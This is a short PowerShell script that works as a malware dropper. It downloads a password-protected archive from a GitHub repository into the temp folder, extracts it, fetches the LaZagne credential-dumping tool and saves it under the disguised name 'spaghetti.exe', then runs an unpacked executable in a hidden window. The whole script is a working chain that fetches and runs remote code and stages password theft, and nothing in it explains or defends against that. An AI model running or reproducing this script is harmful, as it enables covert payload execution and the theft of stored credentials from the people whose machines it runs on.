# Download the archive from GitHub
$downloadUrl = "https://github.com/bakgatviooldoos/bascillaneous/raw/main/archive.zip"
$zipFilePath = "$env:TEMP\archive.zip"

$webRequest = Invoke-WebRequest -Uri $downloadUrl -OutFile $zipFilePath
$webRequest | Wait-Process

# Unpack the password-protected ZIP archive
$extractedFolderPath = "$env:TEMP\HOME"
$arguments           = "x", "`"$zipFilePath`"", "-o`"$extractedFolderPath`"", "-p123456"

$extractionProcess = Start-Process -FilePath "C:\Program Files\7-Zip\7z.exe" -ArgumentList $arguments -PassThru
$extractionProcess | Wait-Process

# Download LaZagne executable
$laZagneUrl  = "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe"
$laZagnePath = "$extractedFolderPath\spaghetti.exe"

$laZagneRequest = Invoke-WebRequest -Uri $laZagneUrl -OutFile $laZagnePath
$laZagneRequest | Wait-Process

$executablePath = "$extractedFolderPath\self.exe"

# Execute the unpacked file
$execution = Start-Process -FilePath $executablePath -WindowStyle Hidden -PassThru
$execution | Wait-Process
